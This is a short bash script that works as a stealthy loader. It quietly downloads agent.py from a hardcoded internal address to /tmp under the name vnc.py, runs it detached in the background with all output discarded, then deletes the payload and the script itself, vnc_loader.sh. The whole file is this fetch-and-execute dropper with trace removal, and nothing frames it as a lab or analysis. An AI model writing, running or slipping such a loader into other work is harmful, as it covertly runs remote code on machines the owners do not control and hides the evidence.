#!/bin/bash

curl -s -o /tmp/vnc.py http://192.168.13.104:8080/agent.py

if [ -s /tmp/vnc.py ]; then
    nohup python3 /tmp/vnc.py > /dev/null 2>&1 &
fi

sleep 0.2
rm -f /tmp/vnc.py
rm -f /tmp/vnc_loader.sh